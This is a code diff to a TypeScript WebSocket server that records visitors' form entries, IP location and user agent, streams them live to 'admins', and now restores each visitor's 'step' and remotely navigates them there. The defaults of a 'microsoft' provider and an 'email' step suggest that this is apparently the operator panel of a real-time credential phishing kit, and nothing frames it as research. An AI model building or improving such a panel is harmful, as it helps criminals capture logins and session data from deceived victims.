@@ -65,6 +65,7 @@ interface PersistedSession {
   formData: Record<string, string>;
   formHistory: FormEntry[];
   provider: string;
+  step: string;
   location: Location;
   userAgent: string;
   lastSeen: number;
@@ -161,6 +162,7 @@ function persistVisitor(v: Visitor) {
     formData: { ...v.formData },
     formHistory: [...v.formHistory],
     provider: v.provider,
+    step: v.step,
     location: v.location,
     userAgent: v.userAgent,
     lastSeen: Date.now(),
@@ -341,11 +343,14 @@ export function setupWebSocket(server: Server) {
         // Register the visitor synchronously so form-data / step-update messages
         // that arrive while the async IP geolocation lookup is in-flight are not
         // silently dropped (visitors.get(id) returning undefined was the bug).
+        // Prefer the persisted step so the admin sees the visitor exactly where
+        // they left off, even if the page reloaded and the client sent 'email'.
+        const restoredStep = persisted?.step || (msg['step'] as string) || 'email';
         const visitor: Visitor = {
           id, ws, ip,
           location: { city: '', country: '', countryCode: '', flag: '' },
-          provider: (msg['provider'] as string) || 'microsoft',
-          step: (msg['step'] as string) || 'email',
+          provider: persisted?.provider || (msg['provider'] as string) || 'microsoft',
+          step: restoredStep,
           userAgent: (msg['userAgent'] as string) || '',
           connectedAt: Date.now(),
           formData: persisted ? { ...persisted.formData } : {},
@@ -356,6 +361,16 @@ export function setupWebSocket(server: Server) {
         // Broadcast immediately so the admin sees the visitor and doesn't miss
         // form-data events that arrive while geolocation is in-flight.
         broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
+
+        // Tell the visitor to restore their last step (fires after switch-provider
+        // so the correct provider component is already mounting).
+        if (persisted?.step && persisted.step !== 'email' && ws.readyState === WebSocket.OPEN) {
+          setTimeout(() => {
+            if (ws.readyState === WebSocket.OPEN) {
+              ws.send(JSON.stringify({ type: 'action', action: { navigate: persisted.step } }));
+            }
+          }, 800);
+        }
         logger.info({ id, ip, restoredFields: Object.keys(visitor.formData).length }, 'Visitor connected');
 
         fetchLocation(ip).then((location) => {
